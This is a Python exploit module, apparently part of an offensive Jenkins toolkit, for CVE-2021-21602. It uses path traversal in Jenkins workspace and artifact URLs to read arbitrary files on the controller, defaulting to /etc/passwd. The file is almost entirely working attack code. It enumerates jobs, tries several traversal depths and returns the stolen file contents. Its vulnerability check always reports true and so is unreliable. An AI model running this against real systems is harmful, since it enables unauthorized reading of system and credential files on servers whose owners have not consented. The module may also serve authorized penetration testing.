"""
CVE-2021-21602: Jenkins Arbitrary File Read via Workspace Browser

This exploit leverages a path traversal vulnerability in Jenkins workspace file browsing
that allows reading arbitrary files on the Jenkins controller filesystem.
"""

import urllib.parse
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2021_21602(ExploitModule):
    """Jenkins arbitrary file read via workspace browsing."""

    CVE_ID = "CVE-2021-21602"

    METADATA = ExploitMetadata(
        cve_id="CVE-2021-21602",
        name="Jenkins Arbitrary File Read via Workspace Browser",
        description="Path traversal vulnerability in workspace file browser allowing arbitrary file read",
        affected_versions=["Jenkins <= 2.274", "LTS <= 2.263.1"],
        mitre_attack=["T1190", "T1552.001", "T1083"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2021-01-13/",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-21602",
            "https://www.cvedetails.com/cve/CVE-2021-21602/"
        ],
        requires_auth=True,
        requires_crumb=False,
        tags=["file-read", "path-traversal", "information-disclosure"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/api/json")
            if response.status_code == 200:
                data = response.json()
                jobs = data.get('jobs', [])
                return len(jobs) >= 0
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2021-21602 for arbitrary file reading.

        This uses path traversal in workspace file browsing to read files
        outside the workspace directory.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - file_path (str): File to read (default: /etc/passwd)
                - job_name (str): Existing job name to use (optional)

        Returns:
            ExploitResult: Result of the exploit
        """
        file_path = kwargs.get('file_path', '/etc/passwd')
        job_name = kwargs.get('job_name')

        try:
            if not job_name:
                response = session.get("/api/json?tree=jobs[name]")
                if response.status_code == 200:
                    data = response.json()
                    jobs = data.get('jobs', [])
                    if jobs:
                        job_name = jobs[0]['name']
                    else:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="failure",
                            details="No jobs found on Jenkins instance",
                            error="No jobs available for exploitation"
                        )
                else:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="failure",
                        details="Failed to enumerate jobs",
                        error=f"HTTP {response.status_code}"
                    )

            traversal_paths = [
                f"../../../..{file_path}",
                f"../../../../..{file_path}",
                f"../../../../../..{file_path}",
                f"../../../../../../..{file_path}",
            ]

            for traversal in traversal_paths:
                encoded_path = urllib.parse.quote(traversal, safe='')
                endpoints = [
                    f"/job/{job_name}/ws/{encoded_path}",
                    f"/job/{job_name}/lastSuccessfulBuild/artifact/{encoded_path}",
                    f"/job/{job_name}/lastBuild/artifact/{encoded_path}",
                ]

                for endpoint in endpoints:
                    try:
                        response = session.get(endpoint)

                        if response.status_code == 200 and len(response.content) > 0:
                            content = response.content.decode('utf-8', errors='ignore')

                            if content and not content.startswith('<!DOCTYPE') and not content.startswith('<html'):
                                return ExploitResult(
                                    exploit=self.CVE_ID,
                                    status="success",
                                    details="File read successful via workspace browsing",
                                    data={
                                        "file_path": file_path,
                                        "content": content,
                                        "content_length": len(content),
                                        "job_name": job_name,
                                        "traversal": traversal,
                                        "endpoint": endpoint
                                    }
                                )
                    except Exception:
                        continue

            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="File read failed on all traversal paths and endpoints",
                error="All workspace browsing attempts returned non-200 status or HTML content"
            )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )
